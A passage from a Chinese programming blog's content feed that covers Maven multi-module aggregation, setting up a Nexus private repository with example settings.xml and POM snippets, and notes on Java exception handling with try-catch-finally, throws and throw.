<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--groupId,artifactId,scope等，不能有version!--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="Maven工程聚合关系"><a href="#Maven工程聚合关系" class="headerlink" title="Maven工程聚合关系"></a>Maven工程聚合关系</h3><p>Maven聚合是指将多个项目组织到一个父级项目中，以便一起构建和管理的机制。聚合可以帮助我们更好地管理一组相关的子项目，同时简化它们的构建和部署过程。<strong>对父工程使用生命周期的操作如clean,test等将对所有子工程执行</strong></p>
<p><strong>聚合作用</strong></p>
<ol>
<li>管理多个子项目：通过聚合，可以将多个子项目组织在一起，方便管理和维护。</li>
<li>构建和发布一组相关的项目：通过聚合，可以在一个命令中构建和发布多个相关的项目，简化了部署和维护工作。</li>
<li>优化构建顺序：通过聚合，可以对多个项目进行顺序控制，避免出现构建依赖混乱导致构建失败的情况。</li>
<li>统一管理依赖项：通过聚合，可以在父项目中管理公共依赖项和插件，避免重复定义。</li>
</ol>
<p><strong>聚合语法</strong><br>父项目中包含的子项目列表。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>parent-project<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>pom<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modules</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--子工程的路径，idea创建子工程可以自动生成--&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--由于子工程与父工程的pom.xml文件处在同一级，故而直接就是子工程名--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>child-project1<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">module</span>&gt;</span>child-project2<span class="tag">&lt;/<span class="name">module</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">modules</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure>


<h2 id="Maven私服"><a href="#Maven私服" class="headerlink" title="Maven私服"></a>Maven私服</h2><p>Maven私服是一种特殊的Maven远程仓库，它是架设在局域网内（也可以部署到公网中）的仓库服务，用来代理位于外部的远程仓库（中央仓库、其他远程公共仓库）。实际上远程仓库就是Github,私服就类似于私有的github式公共仓库。</p>
<p>建立了Maven私服后，当局域网内的用户需要某个构件时，会按照如下顺序进行请求和下载。</p>
<ol>
<li>请求本地仓库，若本地仓库不存在所需构件，则跳转到第 2 步； </li>
<li>请求Maven私服，将所需构件下载到本地仓库，若私服中不存在所需构件，则跳转到第 3 步。 </li>
<li>请求外部的远程仓库，将所需构件下载并缓存到Maven私服，若外部远程仓库不存在所需构件，则Maven直接报错。</li>
</ol>
<p>此外，一些无法从外部仓库下载到的构件，也能从本地上传到私服供其他人使用。<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240813215845.png" alt="Maven私服的工作过程"></p>
<p><strong>Maven私服的优势</strong></p>
<ol>
<li><code>节省外网带宽</code>消除对外部远程仓库的大量重复请求（会消耗很大量的带宽），降低外网带宽压力。</li>
<li><code>下载速度更快</code>Maven私服位于局域网内，从私服下载构建更快更稳定。</li>
<li><code>便于部署第三方构件</code>有些构件无法从任何一个远程仓库中获得（如：公司或组织内部的私有构件、Oracle的JDBC驱动等），建立私服之后，就可以将这些构件部署到私服中，供内部Maven项目使用。</li>
<li><code>提高项目的稳定性，增强对项目的控制</code>如果不建立私服，那么Maven项目的构件就高度依赖外部的远程仓库，若外部网络不稳定，则项目的构建过程也会变得不稳定。建立私服后，即使外部网络状况不佳甚至中断，只要私服中已经缓存了所需的构件，Maven也能够正常运行。私服软件（如：Nexus）提供了很多控制功能（如：权限管理、RELEASE&#x2F;SNAPSHOT版本控制等），可以对仓库进行一些更加高级的控制。</li>
<li><code>降低中央仓库得负荷压力</code>由于私服会缓存中央仓库得构件，避免了很多对中央仓库的重复下载，降低了<br>中央仓库的负荷。</li>
</ol>
<h3 id="使用nexus部署Maven私服"><a href="#使用nexus部署Maven私服" class="headerlink" title="使用nexus部署Maven私服"></a>使用nexus部署Maven私服</h3><p><a href="https://help.sonatype.com/en/download.html">下载连接</a></p>
<p>下载后解压安装包，在nexus文件夹下进入bin文件夹，以管理员权限运行shell，输入.&#x2F;nexus &#x2F;run启动，耐心等待<br>安装完成后通过浏览器访问<code>http://localhost:8081/</code>即可开始管理。</p>
<h4 id="nexus初始配置、仓库和下载包"><a href="#nexus初始配置、仓库和下载包" class="headerlink" title="nexus初始配置、仓库和下载包"></a>nexus初始配置、仓库和下载包</h4><p>进入配置页面后，右上角登录，默认用户名为admin，初始密码记录在<code>&quot;\sonatype-work\nexus3\admin.password&quot;</code>文件中<br>登录后，修改密码，设置为禁止匿名访问。</p>
<p>Nexus初始建有7个仓库，我们使用以maven开头的</p>
<table>
<thead>
<tr>
<th>仓库类型</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>proxy</td>
<td>某个远程仓库的代理</td>
</tr>
<tr>
<td>group</td>
<td>存放：通过Nexus获取的第三方jar包</td>
</tr>
<tr>
<td>hosted</td>
<td>存放：本团队其他开发人员部署到Nexus的jar包</td>
</tr>
</tbody></table>
<table>
<thead>
<tr>
<th>仓库名称</th>
<th>说明</th>
</tr>
</thead>
<tbody><tr>
<td>maven-central</td>
<td>Nexus对Maven中央仓库的代理，帮助从远程仓库下载包</td>
</tr>
<tr>
<td>maven-public</td>
<td>Nexus默认创建，供开发人员下载使用的组仓库,(存储从远程仓库下载的包)</td>
</tr>
<tr>
<td>maven-releases</td>
<td>Nexus默认创建，供开发人员部署自己jar包的宿主仓库要求releases(正式)版本</td>
</tr>
<tr>
<td>maven-snapshots</td>
<td>Nexus默认创建，供开发人员部署自己jar包的宿主仓库要求snapshots(测试)版本</td>
</tr>
</tbody></table>
<p>在设置-&gt;Repositories-&gt;maven-central-&gt;remote storage 标明了远程仓库的地址，建议改为阿里云等镜像地址</p>
<h4 id="通过nexus下载包"><a href="#通过nexus下载包" class="headerlink" title="通过nexus下载包"></a>通过nexus下载包</h4><p>修改本地maven的核心配置文件settings.xml，设置新的本地仓库地址</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 配置一个新的 Maven 本地仓库 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:/maven-repository-new<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>把我们原来配置阿里云仓库地址的mirror标签改成下面这样：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--id可以自由设置，必须与server的id保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-mine<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--name可以自由设置 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus mine<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--以下url从Nexus管理网页maven-public仓库右侧copy复制--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8081/repository/maven-public/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>允许匿名访问时以上操作即可，禁止匿名访问需要设置：</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">server</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--必须与mirror的id保持一致--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-mine<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--密码即自己输入的新密码--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>atguigu<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">server</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>在某一个使用框架的Maven工程执行mvn clean compile可见从私服下载依赖</p>
<h4 id="将jar包部署到Nexus"><a href="#将jar包部署到Nexus" class="headerlink" title="将jar包部署到Nexus"></a>将jar包部署到Nexus</h4><p>在想要部署的Maven工程中修改POM文件<br>（注意，下载修改的是Maven的Settings文件，只需要修改一次）</p>
<p>注意：<strong>这里snapshotRepository的id标签必须和settings.xml中指定的mirror标签(server标签)的id属性一致</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">distributionManagement</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-mine<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--名字可自定义--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Nexus Snapshot<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8081/repository/maven-snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">snapshotRepository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">distributionManagement</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>配置完成后执行：<code>mvn deploy</code></p>
<h4 id="使用别人部署的jar"><a href="#使用别人部署的jar" class="headerlink" title="使用别人部署的jar"></a>使用别人部署的jar</h4><p>在有需求的Maven工程中修改POM</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">repositories</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">repository</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>nexus-mine<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>nexus-mine<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://localhost:8081/repository/maven-snapshots/<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">snapshots</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">snapshots</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">releases</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">enabled</span>&gt;</span>true<span class="tag">&lt;/<span class="name">enabled</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">releases</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">repository</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">repositories</span>&gt;</span></span><br></pre></td></tr></table></figure>





<h2 id="Maven构建常见问题错误"><a href="#Maven构建常见问题错误" class="headerlink" title="Maven构建常见问题错误"></a>Maven构建常见问题错误</h2><h3 id="POM文件为空"><a href="#POM文件为空" class="headerlink" title="POM文件为空"></a>POM文件为空</h3><p>maven版本与JDK版本不兼容，如3.8.8无法兼容jdk21。</p>
]]></content>
      <categories>
        <category>Java</category>
        <category>框架与工具</category>
      </categories>
      <tags>
        <tag>Maven</tag>
      </tags>
  </entry>
  <entry>
    <title>Java-Note3-异常多线程集合泛型常见类</title>
    <url>/2024/06/24/Java-Note3-%E5%BC%82%E5%B8%B8%E5%A4%9A%E7%BA%BF%E7%A8%8B%E9%9B%86%E5%90%88%E6%B3%9B%E5%9E%8B%E5%B8%B8%E8%A7%81%E7%B1%BB/</url>
    <content><![CDATA[<p>Java异常处理 多线程 常用类与基础API 集合框架 泛型 数据结构和集合源码 </p>
<span id="more"></span>

<p><a href="https://www.bilibili.com/video/BV1PY411e7J6/?p=15&spm_id_from=pageDriver&vd_source=20530c92c1be8bd70e37346e3a5c037a">尚硅谷-java基础教程</a><br><a href="https://www.runoob.com/java/java-tutorial.html">菜鸟教程-java</a><br><a href="https://www.runoob.com/manual/jdk11api/index.html">Java API 参考文档</a><br>参考书籍:《java核心技术》《Effective Java》 《java编程思想》</p>
<h2 id="第3阶段：高级应用"><a href="#第3阶段：高级应用" class="headerlink" title="第3阶段：高级应用"></a>第3阶段：高级应用</h2><h3 id="第09章-异常处理"><a href="#第09章-异常处理" class="headerlink" title="第09章_异常处理"></a>第09章_异常处理</h3><p>异常：指出现在执行过程中出现的非正常情况，如果不处理最终将会导致JVM的非正常停止</p>
<p>异常的抛出机制：Java中把不同的异常用不同的类表示，一旦发生某种异常，就<code>创建该异常类型的对象</code>，并且抛出（throw）。然后程序员可以捕获(catch)到这个异常对象，并处理；如果没有捕获(catch)这个异常对象，那么这个异常对象将会导致程序终止。</p>
<p>异常的处理：对于程序出现的异常，一般有两种解决方法：一是遇到错误就终止程序的运行。另一种方法是程序员在编写程序时，就充分考虑到各种可能发生的异常和错误，极力预防和避免。实在无法避免的，要编写相应的代码进行异常的检测、以及<code>异常的处理</code>，保证代码的<code>健壮性</code>。</p>
<p><strong>开发中异常处理方式的选择</strong><br>前提：对于异常，使用相应的处理方式。此时的异常，主要指的是编译时异常。</p>
<ul>
<li>如果程序代码中，涉及到资源的调用（流、数据库连接、网络连接等），则必须考虑使用try-catch-finally来处理，保证不出现内存泄漏。</li>
<li>如果父类被重写的方法没有throws异常类型，则子类重写的方法中如果出现异常，只能考虑使用try-catch-finally进行处理，不能throws。</li>
<li>开发中，方法a中依次调用了方法b,c,d等方法，方法b,c,d之间是递进关系。此时，如果方法b,c,d中有异常，我们通常选择使用throws，而方法a中通常选择使用try-catch-finally。</li>
</ul>
<h4 id="Java异常体系"><a href="#Java异常体系" class="headerlink" title="Java异常体系"></a>Java异常体系</h4><p>1 Throwable<br><code>java.lang.Throwable</code> 类是Java程序执行过程中发生的异常事件对应的类的根父类。</p>
<p>2 Error 和 Exception<br>Throwable可分为两类：Error和Exception。分别对应着<code>java.lang.Error</code>与<code>java.lang.Exception</code>两个类。</p>
<p><strong>Error：</strong>Java虚拟机无法解决的严重问题。如：JVM系统内部错误、资源耗尽等严重情况。一般不编写针对性的代码进行处理。</p>
<ul>
<li>例如：StackOverflowError（栈内存溢出）和OutOfMemoryError（堆内存溢出，简称OOM）。</li>
</ul>
<p><strong>Exception:</strong> 其它因编程错误或偶然的外在因素导致的一般性问题，需要<strong>使用针对性的代码进行处理</strong>，使程序继续运行。否则一旦发生异常，程序也会挂掉。可以分为编译时异常（受检异常）和运行时异常（非受检异常）</p>
<p>例如：</p>
<ul>
<li>空指针访问</li>
<li>试图读取不存在的文件</li>
<li>网络连接中断</li>
<li>数组角标越界</li>
</ul>
<blockquote>
<p>说明： </p>
<ol>
<li>无论是Error还是Exception，还有很多子类，异常的类型非常丰富。当代码运行出现异常时，特别是我们不熟悉的异常时，不要紧张，把异常的简单类名，拷贝到API中去查去认识它即可。</li>
<li>我们本章讲的异常处理，其实针对的就是Exception。</li>
</ol>
</blockquote>
<p>常见异常：<br>运行时异常：</p>
<ul>
<li>数组角标越界：<code>ArrayIndexOutOfBoundsException</code> 如<code>int[] array = new int[10]; array[10] = 1;</code></li>
<li>空指针访问：<code>NullPointerException</code> </li>
<li>类型间转换不兼容：<code>ClassCastException</code> 如<code>obj-&gt;Date</code></li>
<li>数字格式异常：<code>NumberFormatException</code> 如<code>Integer.parseInt(&quot;abc&quot;)</code></li>
<li>输入不匹配异常：<code>InputMIsmatchException</code> 如输入<code>abc-&gt;int num = scanner.nextInt();</code></li>
<li>算术错误异常：<code>ArithmeticException</code> 如<code>10/0</code><br>编译时异常：</li>
<li>类无法找到异常：<code>ClassNoFoundException</code> </li>
<li>文件无法找到异常：<code>FileNoFoundException</code><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.txt&quot;</span>);</span><br><span class="line"><span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file)<span class="comment">//可能出现FileNoFoundException</span></span><br></pre></td></tr></table></figure></li>
<li>输入输出异常：<code>IOException</code><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">fis.close();<span class="comment">//可能出现IOException</span></span><br></pre></td></tr></table></figure></li>
</ul>
<h4 id="异常处理方式1-try-catch-finally"><a href="#异常处理方式1-try-catch-finally" class="headerlink" title="异常处理方式1 try-catch-finally"></a>异常处理方式1 try-catch-finally</h4><p>抓抛模型：try-catch-finally<br>1 抛：程序在执行过程中，一旦出现异常，即在出现异常的代码处生成对应异常类的对象，并将此异常抛出，一旦抛出，此程序不再执行其后代码<br>2 抓：针对过程中抛出的异常对象进行捕获处理。一旦将异常进行了处理，代码就可以继续执行（执行的是try-catch-finally结构结束后的语句而不是try的剩余语句）<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240709164203.png" alt="抓-抛"></p>
<p>基本结构：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    .....<span class="comment">//可能产生异常的代码</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">1</span> e)&#123;</span><br><span class="line">    .....<span class="comment">//产生异常类型1时的处置措施</span></span><br><span class="line">&#125;<span class="keyword">catch</span>(异常类型<span class="number">2</span> e)&#123;</span><br><span class="line">    .....<span class="comment">//产生异常类型2时的处置措施</span></span><br><span class="line">&#125;<span class="keyword">finally</span>&#123;</span><br><span class="line">    .....<span class="comment">//无论是否发生异常都无条件执行的语句</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>将可能出现异常的代码声明在try语句中，针对try中抛出的异常类的对象，使用之后的catch语句进行匹配，一旦匹配进入其语句块进行处理，处理结束代码可继续向下执行。如果声明多个catch结构，不同的异常类型在不存在子父类关系的情况下，为并列关系；若满足子分类关系，必须将子类声明在父类上，否则会报错。 </p>
<p>catch中常见的异常处理方式：</p>
<ol>
<li>自己编写输出的语句</li>
<li>(推荐！)printStackTrace()，打印异常的详细信息（也是一种异常处理的方法，但实际没有处理）</li>
<li>getMessage()，获取发生异常的原因</li>
</ol>
<p>运行时异常的处理：开发中通常不进行显示处理，一旦程序出现此类隐藏，保存日志，根据异常提示信息修改代码即可<br>编译时异常的处理：必须处理，否则无法编译通过</p>
<h4 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h4><p>即使catch语句块中出现异常，也会执行finally中的语句<br>&#x3D;&#x3D;》将一定要执行的代码声明在finally结构中<br>&#x3D;&#x3D;》无论try或catch中是否存在仍未被处理的异常，无论try或catch中是否存在return语句(这种情况下先执行finally最后再执行return)等(除system.exit(0)外)，finally中声明的语句也一定会被执行<br>&#x3D;&#x3D;》finally语句是可选的，但不能单独存在，catch也是</p>
<p>示例</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">result</span> <span class="operator">=</span> test(<span class="number">10</span>);</span><br><span class="line">    System.out.println(result);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> <span class="title function_">test</span><span class="params">(<span class="type">int</span> num)</span>&#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> num;</span><br><span class="line">    &#125;<span class="keyword">catch</span> (NumberFormatException e)&#123;</span><br><span class="line">        <span class="keyword">return</span> num--;</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;test结束&quot;</span>);</span><br><span class="line">        <span class="comment">// return ++num; //若为此句，则上文输出11</span></span><br><span class="line">        <span class="comment">//++num;          //若为此句，则上文输出10 --》这里的num和try中的return的num在内存中不是同一个</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>必须声明在finally中的代码</strong>：在开发中一些资源（如输入输出流，数据库连接，Socket连接等），在使用结束后，必须显示地进行关闭操作，垃圾回收器不会自动回收这些资源，进而可能导致内存泄漏。</p>
<p>示例：实际开发中的finally应用：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span>&#123;</span><br><span class="line">    FileInputStream fileInputStream;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span class="comment">// try中声明的变量只有try中可见--代码块&#123;&#125;</span></span><br><span class="line">        <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.txt&quot;</span>);</span><br><span class="line">        fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);<span class="comment">//可能FileNotFoundException</span></span><br><span class="line">        <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> fileInputStream.read();<span class="comment">//可能IOException</span></span><br><span class="line">        <span class="keyword">while</span> (data != -<span class="number">1</span>)&#123;</span><br><span class="line">            System.out.println((<span class="type">char</span>)data);</span><br><span class="line">            data = fileInputStream.read();<span class="comment">//可能IOException</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//fileInputStream.close();//可能IOException</span></span><br><span class="line">    &#125;<span class="keyword">catch</span> (FileNotFoundException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;<span class="keyword">finally</span> &#123;<span class="comment">//流资源的关闭操作必须放在finall</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">if</span>(fileInputStream!=<span class="literal">null</span>)</span><br><span class="line">                fileInputStream.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="异常处理方式2-throws"><a href="#异常处理方式2-throws" class="headerlink" title="异常处理方式2 throws"></a>异常处理方式2 throws</h4><p>格式：在方法的声明处，使用”throws 异常类型1,异常类型2,…”<br>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">test1</span><span class="params">()</span> <span class="keyword">throws</span> FileNotFoundException, IOException&#123;</span><br><span class="line">    FileInputStream fileInputStream;</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.txt&quot;</span>);</span><br><span class="line">    fileInputStream = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(file);<span class="comment">//可能FileNotFoundException</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">data</span> <span class="operator">=</span> fileInputStream.read();<span class="comment">//可能IOException</span></span><br><span class="line">    <span class="keyword">while</span> (data != -<span class="number">1</span>)&#123;</span><br><span class="line">        System.out.println((<span class="type">char</span>)data);</span><br><span class="line">        data = fileInputStream.read();<span class="comment">//可能IOException</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>作用机制：</p>
<ol>
<li>向调用者抛出异常，实际本身没有处理，</li>
<li>如调用者仍没有解决异常，继续像其调用者抛出异常</li>
<li>直到某上级调用者使用try-catch-finally处理</li>
<li>至少在main()一层必须解决上抛的异常，不能再添加throws</li>
</ol>
<p>说明：</p>
<ul>
<li>(针对编译时异常)子类重写的方法可以抛出父类被重写方法同样的异常或是父类方法异常的子类，但不能抛父类没有的，可以用try-catch-finally直接解决</li>
</ul>
<h4 id="手动抛出异常对象"><a href="#手动抛出异常对象" class="headerlink" title="手动抛出异常对象"></a>手动抛出异常对象</h4><p>Java 中异常对象的生成有两种方式：</p>
<ul>
<li>由虚拟机<strong>自动生成</strong>：程序运行过程中，虚拟机检测到程序发生了问题，那么针对当前代码，就会在后台自动创建一个对应异常类的实例对象并抛出。</li>
<li>由开发人员<strong>手动创建</strong>：<code>new 异常类型([实参列表]);</code>，如果创建好的异常对象不抛出对程序没有任何影响，和创建一个普通对象一样，但是一旦throw抛出，就会对程序运行产生影响了。</li>
</ul>
<p>格式：<code>throw new 异常类名(参数);</code></p>
<p>示例：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorTest</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Student</span> <span class="variable">student</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Student</span>();</span><br><span class="line">        student.register(<span class="number">10</span>);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">        student.register(-<span class="number">11</span>);</span><br><span class="line">        System.out.println(student);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Student</span>&#123;</span><br><span class="line">    <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(<span class="type">int</span> id)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(id &gt; <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">this</span>.id = id;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(<span class="string">&quot;输入的id非法&quot;</span>);<span class="comment">//抛出的异常也要处理</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Student&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;id=&quot;</span> + id +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*输出如下：</span></span><br><span class="line"><span class="comment">Student&#123;id=10&#125;</span></span><br><span class="line"><span class="comment">Exception in thread &quot;main&quot; java.lang.RuntimeException: 输入的id非法</span></span><br><span class="line"><span class="comment">	at com.atguigu01.throwable.Student.register(ErrorTest.java:28)</span></span><br><span class="line"><span class="comment">	at com.atguigu01.throwable.ErrorTest.main(ErrorTest.java:17)</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure>
<p><br><br><br>throw语句抛出的异常对象，和JVM自动创建和抛出的异常对象一样。</p>
<ul>
<li>如果是编译时异常类型的对象，同样需要使用throws或者try…catch处理，否则编译不通过。</li>
<li>如果是运行时异常类型的对象，编译器不提示。</li>
<li>可以抛出的异常必须是Throwable或其子类的实例。下面的语句在编译时将会产生语法错误：</li>
</ul>
<p>使用注意：<br>无论是编译时异常类型的对象，还是运行时异常类型的对象，如果没有被try..catch合理的处理，都会导致程序崩溃。<br>throw语句会导致程序执行流程被改变，throw语句是明确抛出一个异常对象，因此它<code>下面的代码将不会执行</code>。<br>如果当前方法没有try…catch处理这个异常对象，throw语句就会<code>代替return语句</code>提前终止当前方法的执行，并返回一个异常对象给调用者。</p>
